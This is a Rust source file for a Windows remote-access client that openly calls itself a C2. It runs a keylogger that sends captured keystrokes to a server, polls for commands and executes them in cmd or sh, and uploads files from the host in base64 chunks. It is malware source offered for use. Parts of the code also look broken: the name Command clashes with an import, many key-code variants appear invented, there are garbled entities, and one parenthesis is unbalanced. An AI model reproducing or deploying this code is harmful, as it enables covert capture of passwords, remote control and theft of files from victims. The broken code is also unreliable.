use reqwest::{Client, Error, StatusCode};
use reqwest::tls::Certificate;
use tokio::time::{sleep, Duration};
use device_query::{DeviceQuery, DeviceState, Keycode};
use std::process::{Command, Output};
use std::io::{self, Read, Write};
use std::fs::File;
use base64::{engine::general_purpose, Engine as _};
use serde::{Deserialize, Serialize};
use futures::future::join_all;

const SERVER_URL: &apos;static str&apos; = "https://localhost:443";
const POLL_INTERVAL_SECONDS: u64 = 60;
const RECONNECT_INTERVAL_SECONDS: u64 = 10;

#[derive(Serialize, Deserialize, Debug)]
struct ClientData {
    #[serde(rename = "type")]
    data_type: String,
    data: String,
    filename: Option<String>, // For file transfers
    chunk: Option<String>,    // For file transfers
    offset: Option<usize>,    // For file transfers
    total_size: Option<usize>, // For file transfers
}

#[derive(Serialize, Deserialize, Debug)]
struct CommandResponse {
    commands: Vec<Command>,
}

#[derive(Serialize, Deserialize, Debug)]
struct Command {
    command: String,
    filename: Option<String>, // For download command
    content: Option<String>,  // For download command
}


#[tokio::main]
async fn main() -> Result<(), Error> {
    println!("Windows client starting...");

    let client = build_client().expect("Failed to build reqwest client");

    // Simple reconnection loop
    loop {
        match run_client(&amp;client).await {
            Ok(_) => {
                println!("Client finished running.");
                break; // Exit if run_client completes successfully (shouldn&apos;t happen in a C2)
            }
            Err(e) => {
                eprintln!("Client error: {}. Attempting to reconnect in {} seconds...", e, RECONNECT_INTERVAL_SECONDS);
                sleep(Duration::from_secs(RECONNECT_INTERVAL_SECONDS)).await;
            }
        }
    }

    Ok(())
}

fn build_client() -> Result<Client, Error> {
    // Load the self-signed certificate
    // In a real scenario, you&apos;d distribute the server&apos;s CA cert or the self-signed cert
    // and load it here. For this example, we&apos;ll assume the server.crt is available.
    let cert = std::fs::read("../perl_c2_server/server.crt")?;
    let cert = Certificate::from_pem(&amp;cert)?;

    // Build the client with the certificate
    let client = Client::builder()
        .add_root_certificate(cert)
        .build()?;

    Ok(client)
}

async fn run_client(client: &amp;Client) -> Result<(), Error> {
    println!("Client connected. Starting keylogger and command polling.");

    // Spawn tasks for keylogging and command polling
    let keylogger_task = tokio::spawn(keylogger_loop(client.clone()));
    let command_polling_task = tokio::spawn(command_polling_loop(client.clone()));

    // Wait for either task to complete (in a real C2, they should run indefinitely)
    tokio::select! {
        _ = keylogger_task => { println!("Keylogger task finished."); },
        _ = command_polling_task => { println!("Command polling task finished."); },
    }

    Ok(())
}

async fn keylogger_loop(client: Client) -> Result<(), Error> {
    let device_state = DeviceState::new();
    let mut last_keys = vec![];
    let mut key_buffer = String::new();
    let mut last_send_time = tokio::time::Instant::now();

    println!("Keylogger started.");

    loop {
        let keys = device_state.get_keys();
        if keys != last_keys {
            for key in &amp;keys {
                if !last_keys.contains(key) {
                    let key_string = match key {
                        Keycode::LShift | Keycode::RShift => "[SHIFT]".to_string(),
                        Keycode::LControl | Keycode::RControl => "[CTRL]".to_string(),
                        Keycode::LAlt | Keycode::RAlt => "[ALT]".to_string(),
                        Keycode::Enter => "[ENTER]\n".to_string(),
                        Keycode::Backspace => "[BACKSPACE]".to_string(),
                        Keycode::Escape => "[ESC]".to_string(),
                        Keycode::Space => " ".to_string(),
                        Keycode::Tab => "[TAB]".to_string(),
                        Keycode::Up => "[UP]".to_string(),
                        Keycode::Down => "[DOWN]".to_string(),
                        Keycode::Left => "[LEFT]".to_string(),
                        Keycode::Right => "[RIGHT]".to_string(),
                        Keycode::Home => "[HOME]".to_string(),
                        Keycode::End => "[END]".to_string(),
                        Keycode::PageUp => "[PAGEUP]".to_string(),
                        Keycode::PageDown => "[PAGEDOWN]".to_string(),
                        Keycode::Delete => "[DEL]".to_string(),
                        Keycode::Insert => "[INS]".to_string(),
                        Keycode::F1 => "[F1]".to_string(),
                        Keycode::F2 => "[F2]".to_string(),
                        Keycode::F3 => "[F3]".to_string(),
                        Keycode::F4 => "[F4]".to_string(),
                        Keycode::F5 => "[F5]".to_string(),
                        Keycode::F6 => "[F6]".to_string(),
                        Keycode::F7 => "[F7]".to_string(),
                        Keycode::F8 => "[F8]".to_string(),
                        Keycode::F9 => "[F9]".to_string(),
                        Keycode::F10 => "[F10]".to_string(),
                        Keycode::F11 => "[F11]".to_string(),
                        Keycode::F12 => "[F12]".to_string(),
                        Keycode::NumLock => "[NUMLOCK]".to_string(),
                        Keycode::CapsLock => "[CAPSLOCK]".to_string(),
                        Keycode::ScrollLock => "[SCROLLLOCK]".to_string(),
                        Keycode::Pause => "[PAUSE]".to_string(),
                        Keycode::PrintScreen => "[PRINTSCREEN]".to_string(),
                        Keycode::Apps => "[APPS]".to_string(),
                        Keycode::Snapshot => "[SNAPSHOT]".to_string(),
                        Keycode::Numpad0 => "0".to_string(),
                        Keycode::Numpad1 => "1".to_string(),
                        Keycode::Numpad2 => "2".to_string(),
                        Keycode::Numpad3 => "3".to_string(),
                        Keycode::Numpad4 => "4".to_string(),
                        Keycode::Numpad5 => "5".to_string(),
                        Keycode::Numpad6 => "6".to_string(),
                        Keycode::Numpad7 => "7".to_string(),
                        Keycode::Numpad8 => "8".to_string(),
                        Keycode::Numpad9 => "9".to_string(),
                        Keycode::NumpadSubtract => "-".to_string(),
                        Keycode::NumpadAdd => "+".to_string(),
                        Keycode::NumpadDivide => "/".to_string(),
                        Keycode::NumpadMultiply => "*".to_string(),
                        Keycode::NumpadDecimal => ".".to_string(),
                        Keycode::NumpadComma => ",".to_string(),
                        Keycode::NumpadEnter => "[NUMPAD_ENTER]\n".to_string(),
                        Keycode::NumpadEquals => "=".to_string(),
                        Keycode::NumpadClear => "[NUMPAD_CLEAR]".to_string(),
                        Keycode::NumpadEqual => "[NUMPAD_EQUAL]".to_string(),
                        Keycode::NumpadDot => "[NUMPAD_DOT]".to_string(),
                        Keycode::NumpadStar => "[NUMPAD_STAR]".to_string(),
                        Keycode::NumpadSlash => "[NUMPAD_SLASH]".to_string(),
                        Keycode::NumpadMinus => "[NUMPAD_MINUS]".to_string(),
                        Keycode::NumpadPlus => "[NUMPAD_PLUS]".to_string(),
                        Keycode::NumpadDelete => "[NUMPAD_DELETE]".to_string(),
                        Keycode::NumpadInsert => "[NUMPAD_INSERT]".to_string(),
                        Keycode::NumpadHome => "[NUMPAD_HOME]".to_string(),
                        Keycode::NumpadEnd => "[NUMPAD_END]".to_string(),
                        Keycode::NumpadPageUp => "[NUMPAD_PAGEUP]".to_string(),
                        Keycode::NumpadPageDown => "[NUMPAD_PAGEDOWN]".to_string(),
                        Keycode::NumpadLeft => "[NUMPAD_LEFT]".to_string(),
                        Keycode::NumpadRight => "[NUMPAD_RIGHT]".to_string(),
                        Keycode::NumpadUp => "[NUMPAD_UP]".to_string(),
                        Keycode::NumpadDown => "[NUMPAD_DOWN]".to_string(),
                        Keycode::NumpadBegin => "[NUMPAD_BEGIN]".to_string(),
                        Keycode::NumpadDivideSlash => "[NUMPAD_DIVIDE_SLASH]".to_string(),
                        Keycode::NumpadMultiplyStar => "[NUMPAD_MULTIPLY_STAR]".to_string(),
                        Keycode::NumpadSubtractMinus => "[NUMPAD_SUBTRACT_MINUS]".to_string(),
                        Keycode::NumpadAddPlus => "[NUMPAD_ADD_PLUS]".to_string(),
                        Keycode::NumpadDecimalDot => "[NUMPAD_DECIMAL_DOT]".to_string(),
                        Keycode::NumpadCommaComma => "[NUMPAD_COMMA_COMMA]".to_string(),
                        Keycode::NumpadEnterEnter => "[NUMPAD_ENTER_ENTER]\n".to_string(),
                        Keycode::NumpadEqualsEqual => "[NUMPAD_EQUALS_EQUAL]".to_string(),
                        Keycode::NumpadClearClear => "[NUMPAD_CLEAR_CLEAR]".to_string(),
                        Keycode::NumpadEqualEqual => "[NUMPAD_EQUAL_EQUAL]".to_string(),
                        Keycode::NumpadDotDot => "[NUMPAD_DOT_DOT]".to_string(),
                        Keycode::NumpadStarStar => "[NUMPAD_STAR_STAR]".to_string(),
                        Keycode::NumpadSlashSlash => "[NUMPAD_SLASH_SLASH]".to_string(),
                        Keycode::NumpadMinusMinus => "[NUMPAD_MINUS_MINUS]".to_string(),
                        Keycode::NumpadPlusPlus => "[NUMPAD_PLUS_PLUS]".to_string(),
                        Keycode::NumpadDeleteDelete => "[NUMPAD_DELETE_DELETE]".to_string(),
                        Keycode::NumpadInsertInsert => "[NUMPAD_INSERT_INSERT]".to_string(),
                        Keycode::NumpadHomeHome => "[NUMPAD_HOME_HOME]".to_string(),
                        Keycode::NumpadEndEnd => "[NUMPAD_END_END]".to_string(),
                        Keycode::NumpadPageUpPageUp => "[NUMPAD_PAGEUP_PAGEUP]".to_string(),
                        Keycode::NumpadPageDownPageDown => "[NUMPAD_PAGEDOWN_PAGEDOWN]".to_string(),
                        Keycode::NumpadLeftLeft => "[NUMPAD_LEFT_LEFT]".to_string(),
                        Keycode::NumpadRightRight => "[NUMPAD_RIGHT_RIGHT]".to_string(),
                        Keycode::NumpadUpUp => "[NUMPAD_UP_UP]".to_string(),
                        Keycode::NumpadDownDown => "[NUMPAD_DOWN_DOWN]".to_string(),
                        Keycode::NumpadBeginBegin => "[NUMPAD_BEGIN_BEGIN]".to_string(),
                        Keycode::LWin | Keycode::RWin => "[WIN]".to_string(),
                        Keycode::Menu => "[MENU]".to_string(),
                        Keycode::Unknown(_) => format!("[UNKNOWN:{:?}]", key),
                        _ => device_state.get_keys_unescaped().iter().filter(|k| k.keycode == *key).map(|k| k.name.clone()).collect::<Vec<String>>().join(""),
                    };
                    key_buffer.push_str(&amp;key_string);
                }
            }
        }
        last_keys = keys;

        // Send keylog data periodically or if buffer is large
        if last_send_time.elapsed() >= Duration::from_secs(60) &amp;&amp; !key_buffer.is_empty() {
            println!("Sending keylog data...");
            let payload = ClientData {
                data_type: "keylog".to_string(),
                data: key_buffer.clone(),
                filename: None,
                chunk: None,
                offset: None,
                total_size: None,
            };
            match send_data(client.clone(), payload).await {
                Ok(_) => {
                    key_buffer.clear();
                    last_send_time = tokio::time::Instant::now();
                    println!("Keylog data sent successfully.");
                }
                Err(e) => {
                    eprintln!("Failed to send keylog data: {}", e);
                    // Keep data in buffer to retry later
                }
            }
        }

        sleep(Duration::from_millis(50)).await; // Poll every 50ms
    }
}

async fn command_polling_loop(client: Client) -> Result<(), Error> {
    println!("Command polling started.");
    loop {
        sleep(Duration::from_secs(POLL_INTERVAL_SECONDS)).await;
        println!("Polling for commands...");

        match fetch_commands(&amp;client).await {
            Ok(commands) => {
                if !commands.commands.is_empty() {
                    println!("Received {} commands.", commands.commands.len());
                    let mut tasks = vec![];
                    for cmd in commands.commands {
                        let client_clone = client.clone();
                        tasks.push(tokio::spawn(async move {
                            execute_command(&amp;client_clone, cmd).await;
                        }));
                    }
                    join_all(tasks).await;
                } else {
                    println!("No commands received.");
                }
            }
            Err(e) => {
                eprintln!("Failed to fetch commands: {}", e);
            }
        }
    }
}

async fn fetch_commands(client: &amp;Client) -> Result<CommandResponse, Error> {
    let url = format!("{}/client/commands", SERVER_URL);
    let response = client.get(&amp;url).send().await?;

    if response.status().is_success() {
        let commands = response.json::<CommandResponse>().await?;
        Ok(commands)
    } else {
        let status = response.status();
        let text = response.text().await.unwrap_or_else(|_| "N/A".to_string());
        Err(Error::from(io::Error::new(io::ErrorKind::Other, format!("Failed to fetch commands: Status {} - {}", status, text))))
    }
}

async fn execute_command(client: &amp;Client, cmd: Command) {
    println!("Executing command: {:?}", cmd);
    let command_output: String;

    match cmd.command.as_str() {
        "upload" => {
            if let Some(filepath) = cmd.filename {
                command_output = match upload_file(client, &amp;filepath).await {
                    Ok(_) => format!("Successfully uploaded {}", filepath),
                    Err(e) => format!("Failed to upload {}: {}", filepath, e),
                };
            } else {
                command_output = "Upload command requires a filepath.".to_string();
            }
        }
        "download" => {
            if let (Some(filename), Some(content)) = (cmd.filename, cmd.content) {
                 command_output = match download_file(&amp;filename, &amp;content).await {
                    Ok(_) => format!("Successfully downloaded {}", filename),
                    Err(e) => format!("Failed to download {}: {}", filename, e),
                };
            } else {
                command_output = "Download command requires filename and content.".to_string();
            }
        }
        _ => {
            // Execute as a shell command
            let output = if cfg!(target_os = "windows") {
                Command::new("cmd")
                    .arg("/C")
                    .arg(&amp;cmd.command)
                    .output()
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(&amp;cmd.command)
                    .output()
            };

            command_output = match output {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&amp;output.stdout);
                    let stderr = String::from_utf8_lossy(&amp;output.stderr);
                    format!("Stdout:\n{}\nStderr:\n{}", stdout, stderr)
                }
                Err(e) => format!("Failed to execute command: {}", e),
            };
        }
    }


    let payload = ClientData {
        data_type: "cmd_output".to_string(),
        data: command_output,
        filename: None,
        chunk: None,
        offset: None,
        total_size: None,
    };

    if let Err(e) = send_data(client.clone(), payload).await {
        eprintln!("Failed to send command output: {}", e);
    }
}

async fn upload_file(client: &amp;Client, filepath: &amp;str) -> Result<(), Box<dyn std::error::Error>> {
    println!("Attempting to upload file: {}", filepath);
    let mut file = File::open(filepath)?;
    let mut buffer = Vec::new();
    file.read_to_end(&amp;mut buffer)?;

    let filename = std::path::Path::new(filepath)
        .file_name()
        .unwrap_or_else(|| std::ffi::OsStr::new("unknown_file"))
        .to_string_lossy()
        .into_owned();

    let total_size = buffer.len();
    let chunk_size = 1024 * 1024; // 1MB chunks
    let mut offset = 0;

    for chunk in buffer.chunks(chunk_size) {
        let chunk_base64 = general_purpose::STANDARD.encode(chunk);

        let payload = ClientData {
            data_type: "file_chunk".to_string(),
            data: String::new(), // Data field is not used for file chunks
            filename: Some(filename.clone()),
            chunk: Some(chunk_base64),
            offset: Some(offset),
            total_size: Some(total_size),
        };

        println!("Sending file chunk for {} (offset: {})", filename, offset);
        send_data(client.clone(), payload).await?;

        offset += chunk.len();
        sleep(Duration::from_millis(100)).await; // Small delay between chunks
    }

    println!("Finished sending file: {}", filepath);
    Ok(())
}

async fn download_file(filename: &amp;str, content_base64: &amp;str) -> Result<(), Box<dyn std::error::Error>> {
    println!("Attempting to download file: {}", filename);
    let file_content = general_purpose::STANDARD.decode(content_base64)?;

    let mut file = File::create(filename)?;
    file.write_all(&amp;file_content)?;

    println!("File downloaded successfully: {}", filename);
    Ok(())
}


async fn send_data(client: Client, payload: ClientData) -> Result<(), Error> {
    let url = format!("{}/client/data", SERVER_URL);
    let res = client.post(&amp;url)
        .json(&amp;payload)
        .send()
        .await?;

    if res.status().is_success() {
        Ok(())
    } else {
        let status = res.status();
        let text = res.text().await.unwrap_or_else(|_| "N/A".to_string());
        Err(Error::from(io::Error::new(io::ErrorKind::Other, format!("Failed to send data: Status {} - {}", status, text)))))
    }
}